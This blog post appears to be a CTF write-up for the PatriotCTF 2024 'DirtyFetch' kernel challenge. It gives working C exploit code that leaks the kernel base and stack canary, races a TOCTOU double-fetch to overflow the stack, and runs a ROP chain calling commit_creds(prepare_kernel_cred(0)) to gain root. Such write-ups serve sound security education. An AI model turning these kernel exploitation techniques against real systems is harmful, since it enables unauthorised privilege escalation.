<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>PatriotCTF 2024 - DirtyFetch | kileak</title>





<meta name="description" content="PatriotCTF 2024 - DirtyFetch">


<meta name="keywords" content="patriot,dirtyfetch">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2024/patriot24-dirty_fetch/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">PatriotCTF 2024 - DirtyFetch</h1>
      <p class="post-meta">Sep 21, 2024</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>PatriotCTF 2024 - DirtyFetch
<!--break--></p>

  <p>Solves: 9 (expert - 484)</p>

  <p>My kernel is your kernel. Well, some of it. Here’s ioctl.</p>

  <p>Author: Dylan (elbee3779)</p>

  <p>nc chal.competitivecyber.club 8886</p>

  <p>Team: Weak But Leet</p>

  <p>Attachment: 
<a href="https://kileak.github.io/assets/patriot24/dirty_fetch/dirty_fetch.tar.gz">dirty_fetch.tar.gz</a> 
<a href="https://kileak.github.io/assets/patriot24/dirty_fetch/pwn.c">pwn.c</a></p>
</blockquote>

<p>DirtyFetch had a simple race condition in its kernel module, which could be used to overflow the stack to rop.</p>

<p>The module was accessable via <code class="language-plaintext highlighter-rouge">ioctl</code> and provided functionality to</p>

<ul>
  <li>(0x10) set a max length for requests to be read/write</li>
  <li>(0x20) allocate a storage buffer, which can be filled with user data</li>
  <li>(0x30) save the storage buffer to stack</li>
  <li>(0x40) load data from stack into user buffer</li>
</ul>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="mh">0x40</span><span class="p">:</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">get_user</span><span class="p">(</span><span class="n">len</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">ioctl_param</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">){</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Error fetching length!"</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ioctl_param</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">len</span> <span class="o">%</span> <span class="n">max</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Error reading data!"</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">){</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">len</span> <span class="o">%</span> <span class="n">max</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">break</span><span class="p">;</span></code></pre></figure>

<p>Conveniently, the stack buffer isn’t initialized, so we can directly read some leaks from it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">offset</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">load</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">set_value</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set_value</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/vuln"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="c1">// Leak kernel and canary from uninitialized stack content</span>
    <span class="n">load</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">239</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_leak</span> <span class="o">=</span> <span class="n">get_value</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xff00000000000000</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">kernel_leak</span> <span class="o">-</span> <span class="mh">0x35691f</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">get_value</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel leak      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_leak</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base      : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"canary           : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>The leaked stack will look like this:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x0000: 0xffff9e2b82cfa180 0x0000000000000041
0x0010: 0x6f3f415ce113b900 0x0000000000000014
0x0020: 0xffff9e2b8300d948 0xffff9e2b836f07a0
0x0030: 0xffff9e2b82cfa180 0x0000000000000000
0x0040: 0xffffb7e1801afd90 0xffffb7e1801afd90
0x0050: 0x6f3f415ce113b900 0x0000000000000001
0x0060: 0xffffb7e1801afed8 0x0000000000000003
0x0070: 0xffffb7e1801afeec 0x0000000000000000
0x0080: 0x0000000000000000 0xffffffffa03e078c
0x0090: 0xffff9e2b836f07a0 0xffff9e2b82cfa180
0x00a0: 0x0000000431cac513 0xffff9e2b83510026
0x00b0: 0x6f3f415ce113b900 0x0000000000000040 &lt;= stack guard
0x00c0: 0xffffb7e1801afeb0 0x0000000000000000
0x00d0: 0xffff9e2b8300d948 0x0000000000000001
0x00e0: 0xffff9e2b8385b200 0x00ffffffa055691f &lt;= x / kernel_leak</code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">kernel leak      : 0xffffffffa055691f
kernel base      : 0xffffffffa0200000
canary           : 0x6f3f415ce113b900</code></pre></figure>

<p>With a leak to kernel base and knowing the stack guard, we could now safely overflow the stack without breaking it.</p>

<p>But we’ll need to find a way to get around the validations in the module, which will try to hinder us to do that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">edit_storage</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">data</span> <span class="o">*</span> <span class="n">request</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">validate_buf</span><span class="p">(</span><span class="n">buf</span><span class="p">)){</span>
        <span class="n">request</span> <span class="o">=</span> <span class="n">get_storage_contents</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">storage</span> <span class="o">=</span> <span class="n">request</span><span class="p">;</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">request</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Specified size goes out of bounds."</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>When we try to create a storage, <code class="language-plaintext highlighter-rouge">edit_storage</code> will first call <code class="language-plaintext highlighter-rouge">validate_buf</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">validate_buf</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">){</span>
    <span class="n">data</span> <span class="o">*</span> <span class="n">request</span> <span class="o">=</span> <span class="n">get_storage_contents</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">request</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Error fetching storage from userspace!"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">MAX_SIZE</span><span class="p">;</span> <span class="c1">// Check for valid size</span>

    <span class="n">kfree</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">request</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">data</span> <span class="o">*</span> <span class="nf">get_storage_contents</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">){</span>
    <span class="n">data</span> <span class="o">*</span> <span class="n">request</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">*</span><span class="p">)</span><span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">GFP_KERNEL</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">request</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>

    <span class="kt">char</span> <span class="o">*</span> <span class="n">content</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kmalloc</span><span class="p">((</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">),</span><span class="n">GFP_KERNEL</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">content</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">content</span><span class="p">,</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">content</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">request</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">validate_buf</code> will allocate a storage object, copy our input object into it and then check if <code class="language-plaintext highlighter-rouge">request-&gt;length &lt; MAX_SIZE</code> and free the allocated storage object again.</p>

<p>If the length check succeeded, <code class="language-plaintext highlighter-rouge">edit_storage</code> would then allocate the storage again and copy our input object into it again.</p>

<p>But since there are no mutexes in place and our input object gets copied twice (once in <code class="language-plaintext highlighter-rouge">validate_buf</code> to check if it has a valid <code class="language-plaintext highlighter-rouge">length</code> and then again in <code class="language-plaintext highlighter-rouge">edit_storage</code> to create the final storage object) it’s a simple TOCTOU problem.</p>

<p>If we set <code class="language-plaintext highlighter-rouge">length</code> to a valid value before <code class="language-plaintext highlighter-rouge">validate_buf</code>, wait until it finished and then switch to a bigger value (<code class="language-plaintext highlighter-rouge">&gt; MAXSIZE</code>) before <code class="language-plaintext highlighter-rouge">edit_storage</code> calls <code class="language-plaintext highlighter-rouge">get_storage_contents</code> again, this would result in a <code class="language-plaintext highlighter-rouge">request</code> object with <code class="language-plaintext highlighter-rouge">length &gt; MAX_SIZE</code>.</p>

<p>We can do this by using two threads. One will constantly set <code class="language-plaintext highlighter-rouge">length</code> of our <code class="language-plaintext highlighter-rouge">data</code> object to a valid value, wait briefly and then set it to a bigger value. The second thread will then try to allocate a storage buffer over and over again until the size of the allocated buffer matches our target size.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">data</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">length</span><span class="p">;</span>
<span class="p">}</span> <span class="n">data</span><span class="p">;</span>

<span class="n">data</span> <span class="n">maindata</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">init_request_running</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
<span class="p">...</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">threadSwitchLength</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Start switching data length"</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">init_request_running</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">maindata</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
        <span class="n">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
        <span class="n">maindata</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>
        <span class="n">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">threadWriteBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Start allocating storage buffer"</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">init_request_running</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">maindata</span><span class="p">);</span>

        <span class="c1">// Stop, when we won the race</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mh">0x200</span><span class="p">)</span>
            <span class="n">init_request_running</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="p">...</span>

    <span class="n">maindata</span><span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mh">0xf0</span><span class="p">;</span>

    <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>

    <span class="c1">// Race to get a storage with a length &gt; MAX_SIZE</span>
    <span class="n">pthread_t</span> <span class="n">tSwitchLength</span><span class="p">;</span>
    <span class="n">pthread_t</span> <span class="n">tWriteBuffer</span><span class="p">;</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tSwitchLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">threadSwitchLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tWriteBuffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">threadWriteBuffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">pthread_join</span><span class="p">(</span><span class="n">tSwitchLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">tWriteBuffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>As soon as we win the race and the request storage is allocated with a size of <code class="language-plaintext highlighter-rouge">0x200</code>, the threads will stop.</p>

<p>Now, we can <code class="language-plaintext highlighter-rouge">save</code> the storage object into the stack variable <code class="language-plaintext highlighter-rouge">content</code>, which will then overflow it and executes our ropchain on returning from <code class="language-plaintext highlighter-rouge">ioctl</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">save</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">tSwitchLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">tWriteBuffer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// Request is now bigger than content and save will return into ropchain</span>
    <span class="n">save</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[   13.956657] BUG: unable to handle page fault for address: 00000000deadbeef
[   13.956848] #PF: supervisor instruction fetch in kernel mode
[   13.956949] #PF: error_code(0x0010) - not-present page
[   13.957109] PGD 8000000003837067 P4D 8000000003837067 PUD 0 
[   13.957318] Oops: 0010 [#1] SMP PTI
[   13.957662] CPU: 0 PID: 99 Comm: pwn Tainted: G           O      5.4.0 #1
[   13.957817] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   13.958406] RIP: 0010:0xdeadbeef
[   13.958588] Code: Bad RIP value.</code></pre></figure>

<p>With this, we can now prepare a ropchain to do <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> and hopefully get back into our code.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state()
{
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
}
...
void safe_exit(void)
{
    puts("Back in userland");
}

int main(int argc, char *argv[]) {
    save_state();

    ...
    unsigned long prepare_kernel_cred = kernel_base + 0x0895e0;
    unsigned long commit_creds = kernel_base + 0x892c0;
    unsigned long swapgs = kernel_base + 0xc00a2f;  // swapgs_restore_regs_and_return_to_usermode
    unsigned long poprdi = kernel_base + 0x2c3a;
    ...

    // Prepare rop chain for overwrite in content
    maindata.content = buffer;

    unsigned long *ptr = buffer + 0xf0;

    *ptr++ = canary;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = poprdi;
    *ptr++ = 0;
    *ptr++ = prepare_kernel_cred;
    *ptr++ = commit_creds;
    *ptr++ = swapgs + 22;
    *ptr++ = 0x0;
    *ptr++ = 0x0;
    *ptr++ = (unsigned long)safe_exit;
    *ptr++ = user_cs;
    *ptr++ = user_rflags;
    *ptr++ = user_sp;
    *ptr++ = user_ss;

    // Race to get a storage with a length &gt; MAX_SIZE
    pthread_t tSwitchLength;
    pthread_t tWriteBuffer;
    ...
}</code></pre></figure>

<p>First, we use <code class="language-plaintext highlighter-rouge">save_state</code> to store the current registers from userland process <code class="language-plaintext highlighter-rouge">cs</code>, <code class="language-plaintext highlighter-rouge">ss</code>, <code class="language-plaintext highlighter-rouge">rsp</code> and <code class="language-plaintext highlighter-rouge">rflags</code>, which are needed later to switch back from kernelmode to usermode.</p>

<p>The offsets for <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code>, <code class="language-plaintext highlighter-rouge">commit_creds</code>, etc. can be retrieved from <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code> (patching <code class="language-plaintext highlighter-rouge">initramfs</code> before to execute as root user).</p>

<p>When <code class="language-plaintext highlighter-rouge">ioctl</code> returns, it will run into our ropchain, and first do a <code class="language-plaintext highlighter-rouge">pop rdi</code> to set <code class="language-plaintext highlighter-rouge">rdi</code> to <code class="language-plaintext highlighter-rouge">0</code> and call <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> to create a <code class="language-plaintext highlighter-rouge">creds</code> object (with user id <code class="language-plaintext highlighter-rouge">0</code>). Normally we’d now have to move the result from <code class="language-plaintext highlighter-rouge">rax</code> to <code class="language-plaintext highlighter-rouge">rdi</code>, but after <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> both <code class="language-plaintext highlighter-rouge">rax</code> and <code class="language-plaintext highlighter-rouge">rdi</code> already pointed to the correct object, so we can directly call <code class="language-plaintext highlighter-rouge">commit_creds</code> to make them the current creds.</p>

<p>Now we’re already <code class="language-plaintext highlighter-rouge">root</code>, but we still need to get back into usermode.</p>

<p>For this, we can use <code class="language-plaintext highlighter-rouge">swapgs_restore_regs_and_return_to_usermode</code> from the kernel itself (which can also be found via <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code>).</p>

<figure class="highlight"><pre><code class="language-asm" data-lang="asm">0xFFFFFFFF81C00A2F      pop     r15
0xFFFFFFFF81C00A31      pop     r14
0xFFFFFFFF81C00A33      pop     r13
0xFFFFFFFF81C00A35      pop     r12
0xFFFFFFFF81C00A37      pop     rbp
0xFFFFFFFF81C00A38      pop     rbx
0xFFFFFFFF81C00A39      pop     r11
0xFFFFFFFF81C00A3B      pop     r10
0xFFFFFFFF81C00A3D      pop     r9
0xFFFFFFFF81C00A3F      pop     r8
0xFFFFFFFF81C00A41      pop     rax
0xFFFFFFFF81C00A42      pop     rcx
0xFFFFFFFF81C00A43      pop     rdx
0xFFFFFFFF81C00A44      pop     rsi
0xFFFFFFFF81C00A45      mov     rdi, rsp
0xFFFFFFFF81C00A48      mov     rsp, gs:qword_6004
0xFFFFFFFF81C00A51      push    qword ptr [rdi+30h]
0xFFFFFFFF81C00A54      push    qword ptr [rdi+28h]
0xFFFFFFFF81C00A57      push    qword ptr [rdi+20h]
0xFFFFFFFF81C00A5A      push    qword ptr [rdi+18h]
0xFFFFFFFF81C00A5D      push    qword ptr [rdi+10h]
0xFFFFFFFF81C00A60      push    qword ptr [rdi]
0xFFFFFFFF81C00A62      push    rax
0xFFFFFFFF81C00A63      jmp     short loc_FFFFFFFF81C00AA8

0xFFFFFFFF81C00AA8 loc_FFFFFFFF81C00AA8:                   
0xFFFFFFFF81C00AA8      pop     rax
0xFFFFFFFF81C00AA9      pop     rdi
0xFFFFFFFF81C00AAA      swapgs</code></pre></figure>

<p>We can skip all the <code class="language-plaintext highlighter-rouge">pop</code>s at the beginning and just start at <code class="language-plaintext highlighter-rouge">swapgs_restore_regs_and_return_to_usermod+22</code>. Since this will pop 2 values (<code class="language-plaintext highlighter-rouge">rax</code> and <code class="language-plaintext highlighter-rouge">rdi</code>) from the stack, we just add two dummy values in our ropchain for this.</p>

<p>For <code class="language-plaintext highlighter-rouge">swapgs</code> we then add a pointer to <code class="language-plaintext highlighter-rouge">safe_exit</code> as new <code class="language-plaintext highlighter-rouge">rip</code> and add the <code class="language-plaintext highlighter-rouge">cs</code>, <code class="language-plaintext highlighter-rouge">rflags</code>, <code class="language-plaintext highlighter-rouge">sp</code> and <code class="language-plaintext highlighter-rouge">ss</code> from userland, which we retrieved in the begining. This should get us back into usermode and execute <code class="language-plaintext highlighter-rouge">safe_exit</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[   30.857983] Opened.
kernel leak      : 0xffffffffbbb5691f
kernel base      : 0xffffffffbb800000
canary           : 0xd1bd85e84272b100
Start allocating storage buffer
[   30.863118] Data copied!
[   30.863185] Data copied!
...
[   30.866170] Data copied!
Start switching data length
[   30.866247] Data copied!
[   30.866998] Data copied!
[   30.867345] Specified size goes out of bounds.
[   30.867435] Error copying userspace data!
[   30.867616] Data copied!
[   30.867789] Specified size goes out of bounds.
[   30.867845] Error copying userspace data!
...
[   30.879654] Data copied!
Back in userland
[   30.882420] Data saved!
Segmentation fault</code></pre></figure>

<p>Looking good. Since we’re now <code class="language-plaintext highlighter-rouge">root</code> in <code class="language-plaintext highlighter-rouge">safe_exit</code>, we can just read the flag and print it.</p>

